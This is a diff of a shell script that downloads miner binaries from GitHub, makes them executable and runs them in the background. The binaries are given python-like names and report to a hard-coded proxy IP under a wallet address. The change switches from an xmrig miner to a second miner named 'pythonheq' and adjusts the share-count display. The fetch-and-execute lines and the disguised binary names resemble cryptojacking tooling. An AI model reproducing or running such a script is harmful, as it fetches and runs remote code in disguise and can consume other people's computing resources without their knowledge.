@@ -5,7 +5,7 @@
 echo -e '##########################################################################'
 PROX=78.47.69.185
 RVPort=80
-echo -e '################## '"RVXM to $PROX:$RVPort"' Ver:0.0.6     ################'
+echo -e '################## '"RV-VC to $PROX:$RVPort"' Ver:0.0.1     ################'
 echo -e '##########################################################################'
 
 ## getting IP info
@@ -18,21 +18,21 @@ curl ipinfo.io
 ########## CPU ##########
 ####### XM
 #               Executable
-wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
-chmod +x pythonxm
+#wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
+#chmod +x pythonxm
 #                Config
-wget -q https://github.com/one10001/10001code/raw/main/config.json
-sed -i "s+ip0001+RV_$IPNAME+g" config.json
-sed -i "s+xxpppxx+$PROX+g" config.json
+#wget -q https://github.com/one10001/10001code/raw/main/config.json
+#sed -i "s+ip0001+RV_$IPNAME+g" config.json
+#sed -i "s+xxpppxx+$PROX+g" config.json
 
 
 
 ###### VC
-#wget -q https://github.com/one10001/10001code/raw/main/pythonheq
-#chmod +x pythonheq
+wget -q https://github.com/one10001/10001code/raw/main/pythonheq
+chmod +x pythonheq
 
 
-#./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VER_""$IPNAME" -t 4 1> oout 2> oout &
+./pythonheq -v -l $PROX:6006 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VER_""$IPNAME" -t 4 1>> ooutx 2>> ooutx &
 
 ###### 5G
 #wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
@@ -173,7 +173,7 @@ fi
     do
         i=$[$i+1]
         echo -e "${On_Green}Results RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*30000/$i] ${Color_Off}" 
-        echo -e "${On_Blue}Results XM${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep acc oout | wc -l)*30000/$i] ${Color_Off}" 
+        echo -e "${On_Red}Results VC${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep Acc oout | wc -l) ${Color_Off} ///////// ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*30000/$i] ${Color_Off}" 
         sleep 30
     done
 
